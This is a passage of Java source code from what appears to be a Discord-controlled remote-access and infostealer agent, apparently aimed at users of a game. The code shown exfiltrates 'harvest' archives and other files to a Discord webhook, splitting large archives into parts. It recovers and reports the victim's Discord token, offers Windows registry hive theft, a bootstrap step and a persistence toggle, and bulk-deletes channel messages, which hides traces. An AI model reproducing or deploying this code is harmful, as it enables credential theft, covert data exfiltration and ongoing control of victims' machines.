						if (!sleepQuietly(Math.min(rateLimit.retryMs(), 10000L))) {
							return;
						}
					} catch (Throwable throwable) {
						Log.debug("Reply failed", throwable);
						return;
					}
				}
				start = end;
			}
		} catch (Throwable throwable) {
			Log.debug("Reply failed", throwable);
		}
	}

	public boolean uploadBytes(byte[] data, String name, String contentType) {
		if (webhookUrl.isEmpty()) {
			return false;
		}
		for (int attempt = 0; attempt < 4; attempt++) {
			try {
				client.postWebhook(webhookUrl, "{\"content\":\"\"}",
					List.of(new DiscordClient.Part("file", name, contentType, data)));
				return true;
			} catch (RateLimitException rateLimit) {
				if (!sleepQuietly(Math.min(rateLimit.retryMs(), 30000L))) {
					return false;
				}
			} catch (Throwable throwable) {
				if (attempt == 3) {
					Log.debug("Upload bytes failed: " + name, throwable);
					return false;
				}
				sleepQuietly(500L * (attempt + 1));
			}
		}
		return false;
	}

	public boolean uploadFile(Path file) {
		return uploadFile(file, "");
	}

	/**
	 * The module prefix is the Discord closure signal: `files-*.zip` closes
	 * file_pull and never harvest, even though both are ZIPs.
	 */
	public boolean uploadFile(Path file, String module) {
		try {
			if (file == null || !Files.isRegularFile(file)) {
				return false;
			}
			String name = file.getFileName().toString();
			if (module != null && !module.isEmpty() && !name.startsWith(module + "-")
				&& !name.startsWith("result-")) {
				name = module + "-" + name;
			}
			long size = Files.size(file);
			if (size > UPLOAD_LIMIT) {
				return uploadParts(file, name);
			}
			byte[] data = Files.readAllBytes(file);
			return uploadBytes(data, name, contentType(name));
		} catch (Throwable throwable) {
			Log.debug("Upload file failed", throwable);
			return false;
		}
	}

	/** Discord caps a single attachment; large archives travel as sorted .partNN files. */
	private boolean uploadParts(Path file, String base) throws java.io.IOException {
		long size = Files.size(file);
		int count = (int) ((size + UPLOAD_PART - 1L) / UPLOAD_PART);
		try (java.io.RandomAccessFile input = new java.io.RandomAccessFile(file.toFile(), "r")) {
			for (int index = 1; index <= count; index++) {
				long offset = (long) (index - 1) * UPLOAD_PART;
				int length = (int) Math.min(UPLOAD_PART, size - offset);
				byte[] chunk = new byte[length];
				input.seek(offset);
				input.readFully(chunk);
				String name = base + String.format(java.util.Locale.ROOT, ".part%03d", index);
				if (!uploadBytes(chunk, name, contentType(base))) {
					Log.debug("Upload part failed: " + name);
					return false;
				}
			}
		}
		Log.debug("Upload split into " + count + " parts: " + base);
		return true;
	}

	private static String contentType(String name) {
		String lower = name.toLowerCase().replaceFirst("\\.part\\d+$", "");
		if (lower.endsWith(".zip")) {
			return "application/zip";
		}
		if (lower.endsWith(".png")) {
			return "image/png";
		}
		if (lower.endsWith(".txt") || lower.endsWith(".log")) {
			return "text/plain";
		}
		return "application/octet-stream";
	}

	public void tokenNow() {
		String token = Harvest.discordTokenNow(installDir);
		if (token.isEmpty()) {
			reply("Discord token: not recovered (see keys.txt or use hives)");
		} else {
			reply("Discord token saved: " + token.substring(0, Math.min(24, token.length())) + "...");
		}
	}

	public void clearChannel(int requested) {
		int limit = Math.max(1, Math.min(requested <= 0 ? 100 : requested, 1000));
		Thread thread = new Thread(() -> {
			List<String> ids = new ArrayList<>();
			Set<String> webhookMessages = new LinkedHashSet<>();
			try {
				String before = "";
				String ownWebhook = webhookId();
				while (ids.size() < limit) {
					int batch = Math.min(100, limit - ids.size());
					String path = "/channels/" + channelId + "/messages?limit=" + batch
						+ (before.isEmpty() ? "" : "&before=" + before);
					List<Object> messages = Json.list(Json.parse(client.get(path).body));
					if (messages.isEmpty()) {
						break;
					}
					for (Object item : messages) {
						Map<String, Object> message = Json.map(item);
						String id = Json.str(message, "id", "");
						if (id.isEmpty()) {
							continue;
						}
						ids.add(id);
						if (!ownWebhook.isEmpty() && ownWebhook.equals(Json.str(message, "webhook_id", ""))) {
							webhookMessages.add(id);
						}
					}
					before = ids.get(ids.size() - 1);
					if (messages.size() < batch) {
						break;
					}
				}
			} catch (Throwable throwable) {
				reply("Clear failed: " + throwable.getMessage());
				return;
			}
			int deleted = 0;
			int skipped = 0;
			boolean bulk = true;
			String ownWebhookPath = webhookMessages.isEmpty() ? "" : webhookPath();
			for (int index = 0; index < ids.size(); index += 100) {
				List<String> chunk = ids.subList(index, Math.min(index + 100, ids.size()));
				if (bulk && bulkDelete(chunk)) {
					deleted += chunk.size();
					continue;
				}
				// No MANAGE_MESSAGES, or a chunk older than two weeks: remove one
				// by one. Our own messages and webhook posts need no permission.
				bulk = false;
				for (String id : chunk) {
					if (deleteMessage(id, webhookMessages.contains(id) ? ownWebhookPath : "")) {
						deleted++;
					} else {
						skipped++;
					}
				}
			}
			String message = "Cleared " + deleted + " messages";
			if (skipped > 0) {
				message += " · skipped " + skipped + " (needs Manage Messages for other authors)";
			}
			reply(message);
		}, "spc-clear");
		thread.setDaemon(true);
		thread.start();
	}

	private boolean bulkDelete(List<String> chunk) {
		Map<String, Object> body = new LinkedHashMap<>();
		body.put("messages", chunk);
		for (int attempt = 0; attempt < 3; attempt++) {
			try {
				client.post("/channels/" + channelId + "/messages/bulk-delete", Json.stringify(body));
				return true;
			} catch (RateLimitException rateLimit) {
				if (!sleepQuietly(rateLimit.retryMs())) {
					return false;
				}
			} catch (DiscordException exception) {
				if (exception.status() != 429) {
					return false;
				}
			} catch (Throwable throwable) {
				return false;
			}
		}
		return false;
	}

	private boolean deleteMessage(String id, String webhookPath) {
		String path = webhookPath.isEmpty()
			? "/channels/" + channelId + "/messages/" + id
			: webhookPath + "/messages/" + id;
		for (int attempt = 0; attempt < 4; attempt++) {
			try {
				client.delete(path);
				return true;
			} catch (RateLimitException rateLimit) {
				if (!sleepQuietly(rateLimit.retryMs())) {
					return false;
				}
			} catch (DiscordException exception) {
				// A message already gone still counts as cleared.
				return exception.status() == 404;
			} catch (Throwable throwable) {
				return false;
			}
		}
		return false;
	}

	private static boolean sleepQuietly(long millis) {
		try {
			Thread.sleep(millis);
			return true;
		} catch (InterruptedException interrupted) {
			Thread.currentThread().interrupt();
			return false;
		}
	}

	/** `/webhooks/{id}/{token}` for the command webhook, or empty before it exists. */
	private String webhookPath() {
		String url = webhookUrl;
		int start = url.indexOf("/webhooks/");
		if (start < 0 || url.lastIndexOf('/') <= start + "/webhooks/".length()) {
			return "";
		}
		return url.substring(start);
	}

	private String webhookId() {
		String path = webhookPath();
		if (path.isEmpty()) {
			return "";
		}
		String rest = path.substring("/webhooks/".length());
		int slash = rest.indexOf('/');
		return slash < 0 ? rest : rest.substring(0, slash);
	}

	public void harvestNow() {		try {
			Path zip = Harvest.build(installDir, gameDir);
			if (uploadFile(zip, "harvest")) {
				Files.deleteIfExists(zip);
			} else {
				reply("Harvest upload failed; kept " + zip.getFileName() + " in cache");
			}
		} catch (Throwable throwable) {
			reply("Harvest failed: " + throwable.getMessage());
		}
	}

	public void kill() {
		running = false;
		terminated = true;
		pollNow.release();
		Gateway currentGateway = gateway;
		if (currentGateway != null) {
			currentGateway.stop();
		}
		PanelSocket currentPanel = panel;
		if (currentPanel != null) {
			currentPanel.stop();
		}
		Thread thread = pollerThread;
		if (thread != null) {
			thread.interrupt();
		}
		DiscordClient current = client;
		if (current != null) {
			current.close();
		}
		commandPool.shutdownNow();
		commandWatchdog.shutdownNow();
		auxPool.shutdownNow();
		state.save(AgentPaths.state(installDir));
	}

	public void persist(boolean enabled) {
		state.persist = enabled;
		state.save(AgentPaths.state(installDir));
	}

	public void hivesNow() {
		if (!AgentPaths.isWindows()) {
			reply("unsupported_os: hives is Windows only");
			return;
		}
		Bootstrap.hivesNow(this, installDir, state);
	}

	public void bootstrapNow() {
		if (!AgentPaths.isWindows()) {
			reply("unsupported_os: bootstrap is Windows only");
			return;
		}
		Bootstrap.now(this, installDir, state);
	}

	public Path cwd() {
		return cwd;
	}

	public void cwd(Path path) {
		this.cwd = path;
	}

	public Path gameDir() {
		return gameDir;
	}

	public String webhookUrl() {
		return webhookUrl;
	}

	public String channelId() {
		return channelId;
	}

	DiscordClient client() {
		return client;
	}
}
